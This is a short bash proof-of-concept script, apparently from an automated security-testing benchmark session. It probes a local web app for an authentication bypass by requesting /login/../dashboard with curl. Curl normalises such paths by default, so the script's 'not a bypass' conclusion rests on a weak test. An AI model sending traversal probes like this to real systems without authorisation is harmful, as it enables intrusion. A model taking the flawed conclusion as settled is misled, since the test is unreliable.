#!/bin/bash
# POC: Test to verify if /login/../dashboard is actually accessing the dashboard endpoint or bypassing routing logic
# Target: ./repo
# Created: 2025-11-07T22:17:53.000Z
# Session: benchmark-XBEN-088-24-mhpe87h9

echo "=== Testing Path Normalization Vulnerability ==="
echo ""

# Test 1: Direct dashboard access
echo "[*] Test 1: Direct access to /dashboard"
response1=$(curl -s http://localhost/dashboard)
echo "Response: $response1"
echo ""

# Test 2: Path traversal access via /login/../dashboard
echo "[*] Test 2: Access via /login/../dashboard (path traversal)"
response2=$(curl -s http://localhost/login/../dashboard)
echo "Response: $response2"
echo ""

# Test 3: Check if responses are identical
echo "[*] Test 3: Comparing responses"
if [ "$response1" = "$response2" ]; then
    echo "RESULT: Responses are IDENTICAL - This is the same endpoint"
    echo "CONCLUSION: /login/../dashboard simply resolves to /dashboard"
    echo "This is NOT a routing bypass, but rather HTTP path normalization"
    exit 0
else
    echo "RESULT: Responses are DIFFERENT"
    echo "Response 1: $response1"
    echo "Response 2: $response2"
    exit 1
fi